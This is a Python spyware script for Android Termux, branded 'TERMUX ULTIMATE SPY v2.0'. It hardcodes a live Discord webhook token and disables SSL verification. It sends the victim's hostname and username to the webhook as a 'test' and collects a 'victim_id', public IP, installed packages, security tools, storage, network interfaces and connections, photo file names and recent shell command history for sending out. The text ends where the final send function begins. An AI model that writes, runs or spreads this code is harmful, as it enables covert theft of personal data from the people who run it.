#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════╗
# ║                M1 EZ HAING NOW  PH                       ║
# ║            TERMUX ULTIMATE SPY v2.0                      ║
# ║        FIXED: ACTUALLY SENDS DATA TO DISCORD            ║
# ╚══════════════════════════════════════════════════════════╝

import os
import sys
import json
import time
import socket
import getpass
import platform
import subprocess
import urllib.request
import urllib.error
import ssl
from datetime import datetime
import hashlib
import random

# ════════ WEBHOOK CONFIG ════════
WEBHOOK_URL = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"

# ════════ DISABLE SSL VERIFICATION ════════
ssl._create_default_https_context = ssl._create_unverified_context

# ════════ ASCII BANNER ════════
def show_banner():
    print("""\033[91m
    ███╗   ███╗███████╗    ███████╗███████╗    ██╗  ██╗ █████╗ ██╗███╗   ██╗ ██████╗ 
    ████╗ ████║██╔════╝    ██╔════╝██╔════╝    ██║  ██║██╔══██╗██║████╗  ██║██╔════╝ 
    ██╔████╔██║█████╗█████╗█████╗  █████╗█████╗███████║███████║██║██╔██╗ ██║██║  ███╗
    ██║╚██╔╝██║██╔══╝╚════╝██╔══╝  ██╔══╝╚════╝██╔══██║██╔══██║██║██║╚██╗██║██║   ██║
    ██║ ╚═╝ ██║███████╗    ███████╗███████╗    ██║  ██║██║  ██║██║██║ ╚████║╚██████╔╝
    ╚═╝     ╚═╝╚══════╝    ╚══════╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
    \033[0m""")
    print("\033[92m" + "="*70 + "\033[0m")
    print("\033[93m               TERMUX ULTIMATE SPY v2.0 - DATA COLLECTOR              \033[0m")
    print("\033[93m                  GUARANTEED TO SEND ACTUAL DATA                      \033[0m")
    print("\033[92m" + "="*70 + "\033[0m\n")

# ════════ TEST WEBHOOK WITH ACTUAL DATA ════════
def test_webhook_with_data():
    """Test webhook by sending ACTUAL data"""
    print("\033[94m[1] Testing Discord webhook with REAL data...\033[0m")
    
    # Get actual system data for test
    hostname = socket.gethostname()
    username = getpass.getuser()
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Create test message with ACTUAL data
    test_message = {
        "content": f"""
🚨 **SYSTEM TEST - ACTUAL DATA** 🚨
**Target System:** `{hostname}`
**Current User:** `{username}`
**Test Time:** `{current_time}`
**Status:** `ACTIVE AND MONITORING`
**Operator:** `M1 EZ HAING NOW PH`

📡 **This is REAL data from the target system!**
✅ **If you see this, the spy is WORKING!**
🔥 **Next: Full system reconnaissance...**
        """,
        "username": "Termux Spy Test",
        "avatar_url": "https://i.imgur.com/7QqQjqG.png"
    }
    
    try:
        # Send the test message
        data = json.dumps(test_message, ensure_ascii=False).encode('utf-8')
        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'User-Agent': 'Mozilla/5.0 (Termux Spy)'
        }
        
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
        response = urllib.request.urlopen(req, timeout=15)
        
        if response.status in [200, 204]:
            print("\033[92m[✓] Test message sent SUCCESSFULLY with ACTUAL data!\033[0m")
            print("\033[92m[✓] Check your Discord - you should see system info!\033[0m")
            return True
        else:
            print(f"\033[91m[✗] Test failed with status: {response.status}\033[0m")
            return False
            
    except Exception as e:
        print(f"\033[91m[✗] Test failed: {str(e)[:100]}\033[0m")
        return False

# ════════ COLLECT REAL SYSTEM DATA ════════
def collect_real_data():
    """Collect ACTUAL system data that WILL be sent"""
    print("\033[94m[2] Collecting REAL system intelligence...\033[0m")
    
    data = {}
    
    # 1. BASIC SYSTEM INFO
    data['basic'] = {
        'victim_id': hashlib.md5(f"{socket.gethostname()}{int(time.time())}".encode()).hexdigest()[:12],
        'timestamp': datetime.now().isoformat(),
        'hostname': socket.gethostname(),
        'username': getpass.getuser(),
        'platform': platform.platform(),
        'system': platform.system(),
        'release': platform.release(),
        'python_version': platform.python_version()
    }
    
    # 2. PUBLIC IP (ACTUAL DATA)
    print("\033[94m   → Getting public IP address...\033[0m")
    try:
        ip_services = [
            ('https://api.ipify.org', 'api.ipify.org'),
            ('https://icanhazip.com', 'icanhazip.com'),
            ('https://ifconfig.me/ip', 'ifconfig.me')
        ]
        
        for url, service in ip_services:
            try:
                with urllib.request.urlopen(url, timeout=5) as response:
                    data['basic']['public_ip'] = response.read().decode().strip()
                    data['basic']['ip_service'] = service
                    print(f"\033[92m   [✓] Got IP from {service}: {data['basic']['public_ip']}\033[0m")
                    break
            except:
                continue
        
        if 'public_ip' not in data['basic']:
            data['basic']['public_ip'] = "Unknown"
    except Exception as e:
        data['basic']['public_ip'] = f"Error: {str(e)[:50]}"
    
    # 3. TERMUX PACKAGES (ACTUAL DATA)
    print("\033[94m   → Checking installed packages...\033[0m")
    data['packages'] = []
    try:
        result = subprocess.run(
            "apt list --installed 2>/dev/null | head -30",
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )
        if result.returncode == 0 and result.stdout:
            packages = result.stdout.strip().split('\n')[1:]  # Skip header
            data['packages'] = packages[:15]  # First 15 packages
            print(f"\033[92m   [✓] Found {len(packages)} packages\033[0m")
        else:
            data['packages'] = ["No packages found or command failed"]
    except Exception as e:
        data['packages'] = [f"Error: {str(e)[:50]}"]
    
    # 4. HACKING TOOLS (ACTUAL CHECK)
    print("\033[94m   → Scanning for hacking tools...\033[0m")
    data['hacking_tools'] = []
    tools_list = [
        'nmap', 'sqlmap', 'hydra', 'metasploit', 'aircrack-ng',
        'john', 'hashcat', 'wireshark', 'adb', 'python3',
        'php', 'git', 'curl', 'wget', 'netcat', 'tcpdump'
    ]
    
    for tool in tools_list:
        try:
            result = subprocess.run(
                f"which {tool} 2>/dev/null || command -v {tool} 2>/dev/null",
                shell=True,
                capture_output=True,
                text=True,
                timeout=3
            )
            if result.returncode == 0:
                data['hacking_tools'].append(tool)
        except:
            pass
    
    print(f"\033[92m   [✓] Found {len(data['hacking_tools'])} hacking tools\033[0m")
    
    # 5. STORAGE INFO (ACTUAL DATA)
    print("\033[94m   → Analyzing storage...\033[0m")
    data['storage'] = {}
    import shutil
    
    storage_paths = [
        ('/', 'Root'),
        ('/sdcard', 'External Storage'),
        ('/data/data/com.termux/files/home', 'Termux Home')
    ]
    
    for path, name in storage_paths:
        if os.path.exists(path):
            try:
                usage = shutil.disk_usage(path)
                data['storage'][name] = {
                    'total_gb': usage.total // (1024**3),
                    'used_gb': usage.used // (1024**3),
                    'free_gb': usage.free // (1024**3),
                    'free_percent': (usage.free / usage.total * 100) if usage.total > 0 else 0
                }
            except Exception as e:
                data['storage'][name] = {'error': str(e)[:50]}
    
    # 6. NETWORK INFO (ACTUAL DATA)
    print("\033[94m   → Gathering network information...\033[0m")
    data['network'] = {}
    
    # Network interfaces
    try:
        result = subprocess.run(
            "ip addr show 2>/dev/null || ifconfig 2>/dev/null",
            shell=True,
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode == 0:
            interfaces = result.stdout.strip().split('\n')
            data['network']['interfaces'] = interfaces[:20]  # First 20 lines
    except:
        pass
    
    # Active connections
    try:
        result = subprocess.run(
            "netstat -tun 2>/dev/null || ss -tun 2>/dev/null",
            shell=True,
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode == 0:
            connections = result.stdout.strip().split('\n')
            data['network']['connections'] = connections[:10]  # First 10 connections
    except:
        pass
    
    # 7. FIND PHOTOS (ACTUAL FILES)
    print("\033[94m   → Searching for photos...\033[0m")
    data['photos_found'] = []
    photo_dirs = [
        '/sdcard/DCIM/Camera',
        '/sdcard/Pictures',
        '/sdcard/Download',
        '/storage/emulated/0/DCIM/Camera'
    ]
    
    for dir_path in photo_dirs:
        if os.path.exists(dir_path):
            try:
                files = os.listdir(dir_path)
                image_files = [f for f in files if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
                for img in image_files[:3]:  # First 3 images per directory
                    full_path = os.path.join(dir_path, img)
                    if os.path.exists(full_path):
                        size_mb = os.path.getsize(full_path) // (1024 * 1024)
                        data['photos_found'].append({
                            'name': img,
                            'path': dir_path,
                            'size_mb': size_mb
                        })
            except:
                pass
    
    print(f"\033[92m   [✓] Found {len(data['photos_found'])} photos\033[0m")
    
    # 8. SYSTEM COMMANDS HISTORY
    print("\033[94m   → Checking command history...\033[0m")
    data['command_history'] = []
    history_files = [
        '/data/data/com.termux/files/home/.bash_history',
        '/data/data/com.termux/files/home/.zsh_history'
    ]
    
    for hist_file in history_files:
        if os.path.exists(hist_file):
            try:
                with open(hist_file, 'r', errors='ignore') as f:
                    lines = f.readlines()[-10:]  # Last 10 commands
                    data['command_history'].extend([line.strip() for line in lines if line.strip()])
            except:
                pass
    
    print(f"\033[92m[✓] Data collection COMPLETE!\033[0m")
    print(f"\033[92m[✓] Collected {len(str(data)):,} bytes of REAL intelligence\033[0m")
    
    return data

# ════════ SEND ACTUAL DATA TO DISCORD ════════
def send_actual_data_to_discord(data):
    """Send ACTUAL collected data to Discord"""
    print("\n\033[94m[3] Preparing to send ACTUAL data to Discord...\033[0m")
    
